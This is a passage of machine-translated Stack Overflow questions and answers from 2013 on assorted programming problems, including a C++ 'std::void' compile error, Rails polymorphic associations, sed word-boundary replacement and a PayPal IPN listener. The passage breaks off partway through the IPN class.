> 时间：2013-04-25T00:35:08.430

你需要改变

```
s1.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() 
```

# c# - 在我的 C# 5 .NET 4.5 应用程序中调用用 CUDA 和 Thrust C++ 编写的函数

> ID：16204374
> 
> 赞同：0
> 
> 时间：2013-04-25T00:17:52.323
> 
> 标签：c#, .net, cuda, thrust, physx.net

我正在掌握如何从用 C# 5 和 .NET 4.5 编写的应用程序调用 C++ 函数。我正在开发一款独立游戏，需要 CUDA 和 PhysX，所以这种能力对我来说很重要。我发现了 Thrust，这是一个 C++ 库，可以更轻松地实现 CUDA。

现在我想弄清楚是否可以使用 Thrust C++ 创建一个 .DLL，其中包含将利用 GPU 的我的图形特定函数......然后在需要时从我的托管代码中调用这些函数。有没有人做过这样的事情？经验？有什么让我困惑的吗？其他选择？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-29T05:41:50.543

您正在尝试的事情可以完成。请记住，Thrust 大部分都是头文件，如 STL 或 Boost。您使用 STL 或 Boost 生成 DLL 文件的策略也适用于 Thrust。

# highcharts - 最后一列的宽度超出图表的最大值，导致额外的填充

> ID：16204376
> 
> 赞同：0
> 
> 时间：2013-04-25T00:18:06.893
> 
> 标签：highcharts

我有一个日期时间图表，其中有一个可变的最小/最大范围和可变的 pointRange。数据的起点和终点可能会与最小/最大范围重叠。我发现在某些情况下，这会导致图表末尾有大量填充，因为它试图适合最后一列。理想情况下，我认为它应该像对第一列一样切断最后一列。这个问题有解决方法吗？

我在这里转载了它：http: [//jsfiddle.net/uFswf/1/](http://jsfiddle.net/uFswf/1/)

```
$(function () {
var chart1;
$(document).ready(function () {
  chart1 = new Highcharts.Chart($.extend(true, {
    chart: {
        renderTo: 'foo',
        zoomType: '',
        spacingRight: 20,
        spacingLeft: 20,
        events: {}
    },
    title: {
        text: "Test"
    },
    subtitle: {
        text: null
    },
    xAxis: {
        labels: {
            enabled: true
        },
        min: 150,
        max: 500,
        minPadding: 0,
        maxPadding: 0,
        title: {
            text: null
        }
    },
    yAxis: {
        title: {
            text: null
        },
        startOnTick: true,
        showFirstLabel: false
    },
    legend: {
        enabled: false
    },
    credits:{
        enabled: false
    },
    plotOptions: {
        column: {
            pointRange: 300,
            pointPlacement: 'between'
        },
        series: {
            animation: true,
            pointPadding: 0,
            groupPadding: 0
        }
    }, 
    series:[{
        type: 'column',
        data: [
            [100, 50],
            [400, 100]
        ]
    }]
   }));
  });
 }); 
```

# c++ - 'void'之前的预期不合格ID

> ID：16204386
> 
> 赞同：0
> 
> 时间：2013-04-25T00:18:38.913
> 
> 标签：c++, void

我是 C++ 编程的新手，但也需要使用 C++ 代码来校准 Black-Derman-Toy 模型中的兴趣树。在“Modeling Derivatives with C++”一书中找到了所需的源代码。然而它没有用。我知道这个错误出现在论坛的某个地方，但经过一些更改后，另一个错误浮出水面。这真的是有问题的。任何线索都会有所帮助。

```
std::void buildBDT(vector <double> yield_curve,vector <double> volatility_curve, int N, double T) 
```

第 12 行第 6 列 [错误] 在 'void' 之前预期不合格 ID

下面是完整代码

```
std::void buildBDT(vector <double> yield_curve,vector <double> volatility_curve, int N, double T)

/**********************************************************************************
buildBDT : constructs a BDT tree calibrated to the yield curve and volatility curve
[in]  vector<double> yield_curve: vector of yield curve
vector<double> volatility_curve : vector of volatility curves
int N: number of time steps
double T: time to maturity
[out]: void
*******************************************************************************/
#include<iostream>
#include <vector>

std::void buildBDT(vector <double> yield_curve,vector <double> volatility_curve, int N, double T)
{
double r[20][20] = {0.0};// short rate at node i, j
double U[20] = {0.0};// median of the (lognormal) 
// distribution for r at time t
double dt = 0.0;// time step
double volR[20] = {0.0};// short rate volatiliy
double vol[20] = {0.0};// stores calibrated volatility 
// parameter
double P[20] = {0.0};// discount bond prices
double Pu[20] = {0.0};// price of bond in up movement
double Pd[20] = {0.0};// price of bond in down movement
double Qu[20][20] = {0.0};// state securities (Arrow-Debreu) 
// prices for an up movement
double Qd[20][20] = {0.0};// state securities (Arrow-Debreu) 
// prices for a down movement
double R[20] = {0.0};// discount curve rates
const double epsilon = 0.0001;// error tolerance level
double error, error1, error2 = 0.0;// errors computed in numerical search
double error3, error4 = 0.0;// errors computed in numerical search
double sum1, sum2 = 0.0;// sums of ?rst derivatives
double sum3, sum4 = 0.0;// sums of second derivatives
double volSum1, volSum2 = 0.0;// sum of volatilities
double sigVal1 = 0.0;// calibrated volatility parameter
double sigVal2, sigVal3 = 0.0;// computed volatilities in numerical 
// search
double alpha1 = 0.05;// calibrated U(i) parameter
double alpha2 = 0.0;// updated alpha1 (U(i)) parameter
double alpha3 = 0.10; // computed U(i) parameter in numerical 
// search
int i,j;
// precompute constants  assume one year time step
dt = 1;
// initialize yield and volatility curves
for (i = 1; i <= N; i++)
{

R[i] = yield_curve[i-1];
P[i] = 1/(pow((1 + R[i]*dt),i*dt));
volR[i] = volatility_curve[i-1];
}
// initialize nodes
U[0] = R[1];
r[0][0] = R[1];
d[0][0] = 1/(1 + r[0][0]*dt);
vol[0] = volR[1];
Qu[1][1] = 1;
Qd[1][-1] = 1;
// compute Pu[.] and Pd[.]
for (i = 2; i <= N; i++)
{
// solve the following for Pu[i]
sum1 = 0;
sum2 = 0;
error = 0;
alpha1 = 0.92;
do
{
sum1 = (alpha1 + pow(alpha1,exp(-2*volR[i]*sqrt(dt))))/(2*(1 + r[0][0]*dt));
sum2 = (1/(2*(1 + r[0][0]*dt)))*(1 + exp(-2*volR[i]*sqrt(dt))*
(pow(alpha1,exp(-2*volR[i]*sqrt(dt))  1)));
alpha2 = alpha1  (sum1  P[i])/(sum2);
error = abs(alpha2  alpha);
alpha1 = alpha2;
}
while (error > epsilon);

Pu[i] = alpha1;
Pd[i] = pow(Pu[i],exp(-2*volR[i]*sqrt(dt)));
}
// evolve tree for the short rate
for (i = 1; i < N; i++)
{
// update pure security prices at time step i
if (i > 1)
{
for (j = -i+2; j <= i; j += 2)
{
Qu[i][j]= 0.5*Qu[i-1][j-1]*d[i-1][j-1] + 0.5*Qu[i-1][j+1]*d[i-1][j+1];
}
for (j = i-2; j >= -i; j -= 2)
{
Qd[i][j] =0.5*Qd[i-1][j-1]*d[i-1][j-1] + 0.5*Qd[i-1][j+1]*d[i-1][j+1];
}
}
// solve simultaneously for U[i] and sig[i]
// using 2 dimensional Newton-Raphson
// initial guess
alpha1 = 0.05;
sigVal1 = 0.092;
do
{
sum1 = 0;
sum2 = 0;
sum3 = 0;
sum4 = 0;
volSum1 = 0;
volSum2 = 0;
for (j = -i; j <= i; j += 2)
{
sum1 += Qu[i][j]*(1/(1 + alpha1*exp(sigVal1*j*sqrt(dt))*dt));
sum2 += Qu[i][j]*(pow((1+alpha1*exp(sigVal1*j*sqrt(dt))*dt),-
2)*exp(sigVal1*j*sqrt(dt))*dt));
volSum1 += Qu[i][j]*(pow((1+ alpha1*exp(sigVal1*j*sqrt(dt))*dt),-
2)*(alpha1*(j*sqrt(dt))*dt*exp(sigVal1*j*sqrt(dt))));
sum3 += Qd[i][j]*(1/(1 + alpha1*exp(sigVal1*j*sqrt(dt))*dt));
sum4 += Qd[i][j]*(pow((1+ alpha1*exp(sigVal1*j*sqrt(dt))*dt),-2)*(exp(sigVal1*j*sqrt   (dt))*dt));
volSum2 += Qd[i][j]*(pow((1+ alpha1*exp(sigVal1*j*sqrt(dt))*dt),-2)*
(alpha1*(j*sqrt(dt))*dt*exp(sigVal1*j*sqrt(dt))));
}
alpha2 = alpha1  (sum1  Pu[i+1])/(-sum2);
error = abs(alpha2  alpha1);
alpha1 = alpha2;
sigVal2 = sigVal1  (sum1  Pu[i+1])/(-volSum1);
error1 = abs(sigVal2  sigVal1);
sigVal1 = sigVal2;
alpha3 = alpha1  (sum3  Pd[i+1])/(-sum4);
error3 = abs(alpha3  alpha1);
sigVal3 = sigVal1  (sum3  Pd[i+1])/(-volSum2);
error4 = abs(sigVal3  sigVal1);
sigVal1 = sigVal3;
}
while ((error > epsilon) || (error1 > epsilon) || (error3 > epsilon) || 
(error4 > epsilon));
U[i] = alpha;
vol[i] = sigVal1;
// set r[.] and d[.]
for (j = -i; j <= i; j += 2)
{r[i][j] = U[i]*exp(vol[i]*j*sqrt(dt));
d[i][j] = 1/(1 + r[i][j]*dt);
}
}
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T00:20:48.123

`void`不是命名空间的成员`std`。相反，请尝试：

```
 void buildBDT(vector <double> yield_curve,
        vector <double> volatility_curve, int N, double T) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:20:26.507

`void`是 C++ 中的本机类型，因此不能通过任何特定的命名空间访问它。`std::void`应该只是`void`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T00:35:20.590

`void`是 C++ 中的内置类型。它不在任何命名空间中。将声明和定义更改`buildBDT`为：

```
void buildBDT(vector <double> yield_curve,vector <double> volatility_curve, int N, double T) 
```

确保在声明的末尾（第一行）添加分号。这结束了声明并应该修复`variable or field declared void`错误。此外，将`#include`语句移到第一行上方。

此外，为了不因使用该`vector`类型而出现错误，请`using std::vector;`在第一行上方但在 include 语句下方添加，或者如果您想访问`std`命名空间中的所有成员而不必“使用”每个成员，您可以使用`using namespace std;`而不是`using std::vector;`(但是，这[不是一直使用的好主意](https://stackoverflow.com/questions/1452721/why-is-using-namespace-std-considered-a-bad-practice-in-c)）。

您的新代码顶部应如下所示：

```
#include <vector>
using std::vector; //or using namespace std; depending on your preference
void buildBDT(vector <double> yield_curve,vector <double> volatility_curve, int N, double T)
/********** (start of the documentation) 
```

# objective-c - NSMutableDictionary 可可内存泄漏

> ID：16204388
> 
> 赞同：0
> 
> 时间：2013-04-25T00:18:53.787
> 
> 标签：objective-c

下面的代码中是否有任何内存泄漏？我猜不，但对我来说，下面的代码分配内存但不释放它。

任何帮助表示赞赏

```
@autoreleasepool {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    for (int i = 0; i < 300000; i++) {
        @autoreleasepool {
            [dict setObject:[NSNumber numberWithInt:i] forKey:[NSNumber numberWithInt:i]];
        }
    }
    [dict removeAllObjects];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:26:45.120

我不知道这是否会影响您的问题，但值得了解...

NSNumber 在幕后做了一些花哨的事情，特别是对于整数 0 - 12。它并不总是释放它们，因为它假设它很可能需要在将来重用它们。它们被认为足够常用，以至于不想一直保留/删除它们。

请参阅此[讨论](https://stackoverflow.com/q/656902/1804403)。

这可能会导致一点内存没有被释放，但不会占很大比例。

将上面的代码放在 for 循环中会很有趣，看看是否多次调用它会增加内存，或者使用的内存量是否保持不变。

```
for (int i = 0; i < 100; i++) {
    @autoreleasepool {
        NSMutableDictionary *dict = [NSMutableDictionary dictionary];
        for (int i = 0; i < 300000; i++) {
            @autoreleasepool {
                [dict setObject:[NSNumber numberWithInt:i] forKey:[NSNumber numberWithInt:i]];
            }
        }
        [dict removeAllObjects];
    }
} 
```

如果它保持平稳，我不会太担心它。

# javascript - 删除 document.domain 中的数组元素

> ID：16204389
> 
> 赞同：0
> 
> 时间：2013-04-25T00:19:00.893
> 
> 标签：javascript, dns

我正在尝试（并且失败）使用以下方法从 document.domain 中删除最顶层的子域：

```
document.domain.split(".").splice(1, length + 1).join(".") 
```

虽然在域 sub2.sub1.example.com 上，但如果我将它放在脚本中但在控制台中，它只会不断返回“sub1”。我有点不知所措，因为它在链接的 js 文件和控制台之间的行为不同。

为了调试，我尝试将每个步骤写入控制台，输出如下：

```
console.log(document.domain); >> sub2.sub1.example.com
console.log(document.domain.split(".")); >> ["sub2", "sub1", "example", "com"]
console.log(document.domain.split(".").splice(1, length + 1)); >> ["sub1"]
console.log(document.domain.split(".").splice(1, length + 1).join(".")); >> sub1 
```

但在 chrome 开发者控制台中，我得到：

```
document.domain.split(".").splice(1, length + 1).join(".") >> "sub1.example.com" 
```

谁能指出我正确的方向，或者至少告诉我为什么我会根据其执行方式得到不同的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:29:28.123

更好的方法：

```
var foo = 'sub2.sud1.domain.com';
foo.replace(/^[^\.]+\./,""); 
```

您的代码中的错误是未设置长度，我相信您错过了一些东西。

# backbone.js - 骨干木偶 renderModel() 不适用于复合视图

> ID：16204395
> 
> 赞同：2
> 
> 时间：2013-04-25T00:19:47.510
> 
> 标签：backbone.js, marionette

我正在使用复合视图来显示带有 Backbone Marionette 的表格，但是在我对模型进行提取后，当数据进入时，让模板的包装部分重新呈现时遇到了一些麻烦。这是我的模板：

复合视图的模板：

```
<thead>
 <tr>
  {{#each report.columns}}
   <th>{{name}}</th>
  {{/each}}
 </tr>
</thead>
<tbody></tbody> 
```

和 ItemView 的模板：

```
{{#each cols}} <td>{{value}}</td> {{/each}} 
```

在我的控制器函数中，我正在创建模型的实例，创建并显示视图，并进行获取以将我的数据放入模型中：

```
var tView = new tableCompositeView({collection: rowsCollection, model: configModel});
layoutView.tablecontent.show(tView);
rowsCollection.fetch();
configModel.fetch(); 
```

收集项目很好，获取成功时会更新视图。但是，当 configModel.fetch() 完成时，复合视图模板中的包装位永远不会更新。

在文档中，它说您可以使用 .renderModel() 仅重新渲染视图中处理模型的部分。当我这样做时：

```
configModel.fetch().success(function(){ tView.renderModel(); }); 
```

没有什么变化。但是当我使用 .render() 时：

```
configModel.fetch().success(function(){ tView.render(); }); 
```

它工作正常并得到更新。这现在可以工作，但它正在重新渲染我的整个表格，这可能是一种性能问题

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T01:53:15.547

我认为在这种情况下文档具有误导性。renderModel 返回渲染视图的 html。它不会触及 $el。

[来源](https://github.com/marionettejs/backbone.marionette/blob/master/src/marionette.compositeview.js#L86)：

```
renderModel: function(){
  var data = {};
  data = this.serializeData();
  data = this.mixinTemplateHelpers(data);

  var template = this.getTemplate();
  return Marionette.Renderer.render(template, data);
}, 
```

如果您有兴趣以正确的顺序渲染事物，则不必担心显式调用渲染。相反，您可以推迟显示视图，直到您的模型获取完成。然后只需调用 App.region.show(view); 将为您准备好一切。

这是一个小提琴来说明：http: [//jsfiddle.net/nEArw/12/](http://jsfiddle.net/nEArw/12/)

```
var metaPromise = Mod.metaModel.fetch({dataType: "jsonp"});
var tagsPromise = Mod.tagsCollection.fetch({dataType: "jsonp"});

metaPromise.done(function(data) {
    App.region.show(Mod.compositeView);
});

tagsPromise.done(function(data) {
    console.log("tags fetched!"); 
}); 
```

如果在显示视图后发生模型更新，并且您希望避免重新渲染整个组合，您可以在组合视图中使用 modelEvents 来更新单个元素。

[https://github.com/marionettejs/backbone.marionette/blob/master/docs/marionette.view.md#viewmodelevents-and-viewcollectionevents](https://github.com/marionettejs/backbone.marionette/blob/master/docs/marionette.view.md#viewmodelevents-and-viewcollectionevents)

```
modelEvents: {
    "change:name": "nameChanged" 
 }, 
```

或者，如果您想更深入地了解兔子洞，您可以使用模型绑定插件。 [https://github.com/theironcook/Backbone.ModelBinder](https://github.com/theironcook/Backbone.ModelBinder)

# java - 我如何阅读这个标题？

> ID：16204397
> 
> 赞同：1
> 
> 时间：2013-04-25T00:19:58.000
> 
> 标签：java, generics

```
private static <T> List<T> createListOfType(Class<T> type){
    return new ArrayList<T>();          
} 
```

我明白它想做什么，但我不明白这部分 `<T> List<T>`

为什么不简单`List<T>`

预先感谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T00:21:06.530

第一个`<T>`声明`T`该方法的泛型类型参数。下一部分`List<T>`是返回类型。如果不声明`<T>`，符号`T`将无法解析。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:23:03.277

签名部分指定方法的`List<T>`返回类型。它将返回`List`具有所提供类的参数化类型的 a。

因此，如果`Class<String>`作为参数提供，则该方法基本上会执行以下操作：

```
private static List<String> createListOfType(Class<T> type){
    return new ArrayList<String>();          
} 
```

# list - 使用列表中的所有值作为参数（方案）

> ID：16204399
> 
> 赞同：0
> 
> 时间：2013-04-25T00:20:05.603
> 
> 标签：list, parameters, scheme, arguments, procedure

```
 (define a_list (list 2 3 4))
    (define (add x y z)
      (+ x y z))
    (add a_list) 
```

显然这不起作用，但正确的方法是什么？我想要做的是使用列表中随机数量的变量作为过程调用中的参数。列表中的变量数量当然必须与过程具有的参数数量相匹配，但不要考虑这一点，因为这不是我想知道的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:23:45.767

这是该`apply`功能的用途：

```
(apply add a_list) 
```

# objective-c - Objective-C：具有属性的类设计

> ID：16204401
> 
> 赞同：1
> 
> 时间：2013-04-25T00:20:39.313
> 
> 标签：objective-c, class

我想要一些关于如何对这个类进行编程的想法，该类需要预先设置其所有变量和属性才能使其工作。我正在考虑创建一种方法来设置 3 `CCSprite`s。但是属性呢？我应该做一个`NSAssert`以确保它们是由用户设置的，还是有更好的方法？

```
@interface DigParallaxBackgroundLayer : CCLayer
{
    CCSprite *background1;
    CCSprite *background2;
    CCSprite *background3;
}

@property (nonatomic, assign) float bg1ScrollSpeed;
@property (nonatomic, assign) float bg2ScrollSpeed;
@property (nonatomic, assign) float bg3ScrollSpeed;

@property (nonatomic, assign) CGPoint initialOffset; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:28:50.470

在外部提供班级的协作者是一个好主意，而不是让班级创建自己的协作者。这称为[依赖注入](http://en.wikipedia.org/wiki/Dependency_injection)。. . *（如果您让班级设置了自己的默认值和合作者，然后想要更改这些，您必须找到所有他们使用的地方并一个接一个地更改它们......而且班级也很难进行单元测试）*。

. . . 如果你在你的类中传播这种方法，你最终会得到一个顶级的装配/连接类，它可以用来执行配置管理（合理的默认值），以及将组件连接到一个功能完整的整体中。

这里可以使用两个品种：

*   **初始化程序注入：**这是由初始化程序方法提供所需协作者的地方。这种方法的好处之一是在继续之前很容易断言该类处于所需状态。

*   **属性注入：**这是通过属性设置器设置所需协作者的地方。当一个类由许多其他类组成时，这种方法的好处之一是它提高了可读性。这种方法的一个缺点是很容易使对象进入不正确的状态。. . 一些依赖注入库提供了一个回调方法来避免这种情况。

在对象不可变的情况下（即协作者在运行时不会改变），我喜欢使用只读属性并通过初始化程序注入它们。这促进了一个清晰的契约，并使得在继续之前断言对象处于所需状态变得容易。. . . 否则我喜欢使用在执行属性设置器后调用的方法。

**注意：** assert 非常适合在调试模式下检查所需状态，但默认情况下它不会在运行时执行。（这可能是也可能不是您想要的）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:25:39.747

为属性找到合理的默认值，和/或创建一个包含每个属性值的初始化程序：

```
-initWithBG1ScrollSpeed:bg2ScrollSpeed:bg3ScrollSpeed: 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:36:53.623

# 回答

您应该在`init`方法中设置合理的默认值。您还应该确保在更改属性时将其设置为合理的值。

请注意，默认情况下，NSAssert 不会在您的应用程序的生产版本中执行（您可以更改此行为，但不建议这样做；请参阅[https://stackoverflow.com/a/6445429/1445366](https://stackoverflow.com/a/6445429/1445366)）

您还可以创建自定义类工厂方法。就像是：

```
+ (DigParallaxBackgroundLayer *) newBackgroundLayerWithDefaultScrollSpeed:(float)defaultSpeed {
    DigParallaxBackgroundLayer * newLayer = [[DigParallaxBackgroundLayer alloc] init];
    newLayer.bg1ScrollSpeed = newlayer.bg2ScrollSpeed = newLayer.bg3ScrollSpeed = defaultSpeed;
    return newLayer;
} 
```

# 进一步的评论

当你用 , 之类的变量名开始一个新类时`something1`，`something2`你`something3`几乎总是会后悔的。

创建一个 CCSprites 的 NSArray 和另一个具有您的速度的 NSArray 几乎总是更好。（您可以使用 NSValue 或 NSNumber 将简单变量包装在一个对象中，以便它们进入 NSArray）。

更好的是，您可以创建另一个非常简单的具有属性`background`和的类`scrollSpeed`，然后将它们放入 NSArray。

# regex - 用于替换不同字符串的 Unix 命令

> ID：16204402
> 
> 赞同：1
> 
> 时间：2013-04-25T00:20:43.773
> 
> 标签：regex, shell, unix, sed

我有这个 sed 命令：

```
sed 's/old/new/g' file.txt 
```

但它也替换了字符串“文件夹”中的旧版本。如果左侧或右侧没有字符，我该如何替换字符串？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T02:16:58.940

如果不挑剔，在两侧插入空白将适合您。

```
sed 's/ old / new /g' file.txt 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:27:20.617

使用`\b`：

`'s/\bold\b/new/g'`

我通常坚持使用 perl：

`perl -pi -e 's/\bold\b/new/g' file.txt`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T06:06:56.627

这可能对您有用：

```
sed 's/\<old\>/new/g' file 
```

顺便说一句，如果你想要相反的（使用 GNU sed）：

```
sed 's/\Bold\B/new/g' file 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T00:25:47.443

为了与不支持 PCRE 字边界扩展的 sed 版本兼容，您需要自己模拟该扩展的效果：

```
sed -r 's@(^|[^[:alpha:]])old($|[^[:alpha:]])@\1new\2@g' 
```

# c# - 制作平均程序

> ID：16204406
> 
> 赞同：-3
> 
> 时间：2013-04-25T00:21:12.363
> 
> 标签：c#, user-interface, average

我正在尝试制作一个程序来查找动态双打数的平均值，但我需要参考其他方法中的项目。

```
public int count = 0;
    public double[] nums = new double[1000];
    public Form1()
    {
        InitializeComponent();
        label3.Text = "";
    }

    public void button1_Click(object sender, EventArgs e)
    {
        count++;
        string mucho = textBox1.Text;
        nums[count] = Double.Parse(mucho);
        string countstr = Convert.ToString(count);
        label3.Text = countstr;
    }

    public void button2_Click(object sender, EventArgs e)
    {
        double average = 0;
        int count2 = 0;
        string countstr2 = label3.Text;
        int value = Convert.ToInt32(countstr2);
        while (count2 <= value)
        {
            count2++;
            average = +nums[count2];
        }
        double average2;
        average2 = average / count2;
        string ans = Convert.ToString(average2);
        label2.Text = ans;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T05:50:21.273

只需使用 List 或编写自己的平均函数

```
 private void button1_Click(object sender, EventArgs e)
    {
        List<double> dynDouble = new List<double>();

        // TODO Cast your array to a List<double>

        double result = dynDouble.Average();
    } 
```

# ruby-on-rails - 关系数据库实现

> ID：16204407
> 
> 赞同：0
> 
> 时间：2013-04-25T00:21:16.160
> 
> 标签：ruby-on-rails, database, model-view-controller, database-design

不确定最好的实现是什么。我有两种不同类型的属性要跟踪故障。我希望能够在特定属性的显示页面上显示故障，然后在故障索引页面上查看所有故障。

有多个与每个属性相关的故障表，还是每个属性链接到一个故障表会更好吗？如果将故障表中的多个空白 id 属性放在一起，我会担心它们。但如果它们被分开，我担心在视图中显示它们。我用rails实现了这个。

一张故障表

```
Cars                   Trucks                Faults
-----------            ----------           -----------
car_id                 truck_id              fault_id
attribute_1            attribute_1           car_id
                                             truck_id
                                             fault description 
```

两个故障表（每个属性一个）

```
Cars                   Trucks                car_Faults              truck_faults
-----------            ----------           -----------              -----------------
car_id                 truck_id              car_fault_id            truck_fault_id
attribute_1            attribute_1           car_id                  truck_id  
                                             fault description       fault description 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:57:45.240

您可以将多态关联与您现在拥有的模型一起使用，也可以使用单表继承将汽车和卡车组合成一个类。

* * *

**多态关联**如下所示：

```
Cars                   Trucks                Faults
-----------            ----------           -----------
id                     id                    id
attribute_1            attribute_1           faultable_id
                                             faultable_type
                                             fault description 
```

您必须将`faultable_id`(int) 和`faultible_type`(string) 列添加到`Fault`. 模型将如下所示：

```
def Car < ActiveRecord::Base
  has_many :faults, :as => :faultable
end

def Truck < ActiveRecord::Base
  has_many :faults, :as => :faultable
end

def Fault < ActiveRecord::Base
  belongs_to :faultable, :polymorphic => true
end 
```

允许您这样做：

```
@car.fault
# => returns car's fault

@fault.faultible
# => returns car or truck 
```

* * *

**单表继承 (STI)**如下所示：

```
Vehicle                Faults
-----------            ---------- 
id                     id   
type                   vehicle_id
attribute_1            fault description 
```

这有点难以理解，但`Car`都会`Truck`从`Vehicle`超类继承错误。*这允许您在仅使用一个数据库表（单表*继承）的同时将汽车和卡车与故障相关联。

汽车和卡车将作为车辆记录存储，并共享共同属性。这非常适合具有几乎相同属性的模型，例如“颜色”或“品牌”。请记住，未使用的属性（卡车对象中的汽车属性）将为零。如果您正在处理许多不可互换的属性（因此也有许多 nil），最好使用多态关联。

楷模：

```
def Vehicle < ActiveRecord::Base
  has_many :faults
end

def Car < Vehicle
end

def Truck < Vehicle
end

def Fault < ActiveRecord::Base
  belongs_to :vehicle
end 
```

有了这个，你可以这样做：

```
@truck.fault
# => returns truck's fault

@fault.vehicle
# => returns either a Car or Truck object, depending on the type 
```

使用 STI 有一些注意事项：

*   您必须实例化一个子类（汽车或卡车）；*永远不要*实例化超类（即。`Vehicle.new`）。不要触碰 的`type`属性`Vehicle`。Rails 会自动处理它。

*   没有集合类方法，因此`Truck.faults`（所有卡车的故障）之类的方法将不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:42:21.157

如果您希望能够同时显示所有故障并且还能够显示每个属性的故障，我认为这样的解决方案可能就是您正在寻找的

```
Vehicles                Faults                      Types
-----------            -----------                 ---------
vehicle_id             fault_id                    vehicle_type
vehicle_type(FK)       vehicle_id(FK)                  
attribute_1            vehicle_type(FK)
                       fault_description 
```

然后有一个条目 in `Types`，一个用于`Car`，一个用于`Truck`

Edit ：经过进一步思考，我意识到`vehicle_type`in是不必要的，因为您可以使用以下方法`Faults`来获取错误：`Car`

```
SELECT fault_id AS F FROM Faults WHERE F.vehicle_id IN
  SELECT vehicle_id FROM Vehicles AS V WHERE V.vehicle_type IN
    SELECT vehicle_type FROM Types WHERE vehicle_type = 'Car' 
```

# php - 将 Paypal IPN 变量打印到屏幕上

> ID：16204411
> 
> 赞同：1
> 
> 时间：2013-04-25T00:21:36.723
> 
> 标签：php, paypal, callback, listener, paypal-ipn

这是我在这个论坛的第一篇文章:) 我的英语不好，所以我为我的错误道歉。

这就是问题所在 - 我有 Paypal IPN 文件（下面的代码），它将变量发送到电子邮件。我不想在邮件中收到它们，付款后我想在浏览器屏幕上打印它们。你能帮我做这件事吗？

回调.php

```
<?php
ini_set('log_errors', true);
ini_set('error_log', dirname(__FILE__).'/ipn_errors.log');

// instantiate the IpnListener class
include('ipnlistener.php');
$listener = new IpnListener();

/*
When you are testing your IPN script you should be using a PayPal "Sandbox"
account: https://developer.paypal.com
When you are ready to go live change use_sandbox to false.
*/
$listener->use_sandbox = false;

/*
By default the IpnListener object is going  going to post the data back to PayPal
using cURL over a secure SSL connection. This is the recommended way to post
the data back, however, some people may have connections problems using this
method. 

To post over standard HTTP connection, use:
$listener->use_ssl = false;

To post using the fsockopen() function rather than cURL, use:
$listener->use_curl = false;
*/

/*
The processIpn() method will encode the POST variables sent by PayPal and then
POST them back to the PayPal server. An exception will be thrown if there is 
a fatal error (cannot connect, your server is not configured properly, etc.).
Use a try/catch block to catch these fatal errors and log to the ipn_errors.log
file we setup at the top of this file.

The processIpn() method will send the raw data on 'php://input' to PayPal. You
can optionally pass the data to processIpn() yourself:
$verified = $listener->processIpn($my_post_data);
*/
try {
    $listener->requirePostMethod();
    $verified = $listener->processIpn();
} catch (Exception $e) {
    error_log($e->getMessage());
    exit(0);
}

/*
The processIpn() method returned true if the IPN was "VERIFIED" and false if it
was "INVALID".
*/
if ($verified) {
    /*
    Once you have a verified IPN you need to do a few more checks on the POST
    fields--typically against data you stored in your database during when the
    end user made a purchase (such as in the "success" page on a web payments
    standard button). The fields PayPal recommends checking are:

        1\. Check the $_POST['payment_status'] is "Completed"
        2\. Check that $_POST['txn_id'] has not been previously processed 
        3\. Check that $_POST['receiver_email'] is your Primary PayPal email 
        4\. Check that $_POST['payment_amount'] and $_POST['payment_currency'] 
           are correct

    Since implementations on this varies, I will leave these checks out of this
    example and just send an email using the getTextReport() method to get all
    of the details about the IPN.  
    */
    mail('my@mail.com', 'Valid IPN', $listener->getTextReport());
} else {
    /*
    An Invalid IPN *may* be caused by a fraudulent transaction attempt. It's
    a good idea to have a developer or sys admin manually investigate any 
    invalid IPN.
    */
    mail('my@mail.com', 'Invalid IPN', $listener->getTextReport());
}

?> 
```

ipnlistener.php

```
<?php
class IpnListener {

    /**
     *  If true, the recommended cURL PHP library is used to send the post back 
     *  to PayPal. If flase then fsockopen() is used. Default true.
     *
     *  @var boolean
     */
    public $use_curl = true;     

    /**
     *  If true, explicitly sets cURL to use SSL version 3\. Use this if cURL
     *  is compiled with GnuTLS SSL.
     *
     *  @var boolean
     */
    public $force_ssl_v3 = true;     

    /**
     *  If true, cURL will use the CURLOPT_FOLLOWLOCATION to follow any 
     *  "Location: ..." headers in the response.
     *
     *  @var boolean
     */
    public $follow_location = false;     

    /**
     *  If true, an SSL secure connection (port 443) is used for the post back 
     *  as recommended by PayPal. If false, a standard HTTP (port 80) connection
     *  is used. Default true.
     *
     *  @var boolean
     */
    public $use_ssl = true;      

    /**
     *  If true, the paypal sandbox URI www.sandbox.paypal.com is used for the
     *  post back. If false, the live URI www.paypal.com is used. Default false.
     *
     *  @var boolean
     */
    public $use_sandbox = false; 

    /**
     *  The amount of time, in seconds, to wait for the PayPal server to respond
     *  before timing out. Default 30 seconds.
     *
     *  @var int
     */
    public $timeout = 30;       

    private $post_data = array();
    private $post_uri = '';     
    private $response_status = '';
    private $response = '';

    const PAYPAL_HOST = 'www.paypal.com';
    const SANDBOX_HOST = 'www.sandbox.paypal.com';

    /**
     *  Post Back Using cURL
     *
     *  Sends the post back to PayPal using the cURL library. Called by
     *  the processIpn() method if the use_curl property is true. Throws an
